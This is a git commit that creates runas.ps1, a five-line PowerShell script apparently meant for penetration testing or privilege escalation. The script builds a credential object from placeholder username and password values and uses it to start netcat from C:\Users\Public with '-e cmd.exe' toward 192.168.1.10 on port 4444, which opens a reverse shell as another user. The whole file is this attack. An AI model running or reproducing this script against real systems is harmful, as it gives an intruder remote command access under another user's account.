9ceae27a288abd00372551295647428124be002e
frizb <frizb_@hotmail.com>
2018-10-23 11:33:18 -0600

    Create runas.ps1

---
+++ runas.ps1
@@ -0,0 +1,5 @@
+$username = '<username here>'
+$password = '<password here>'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
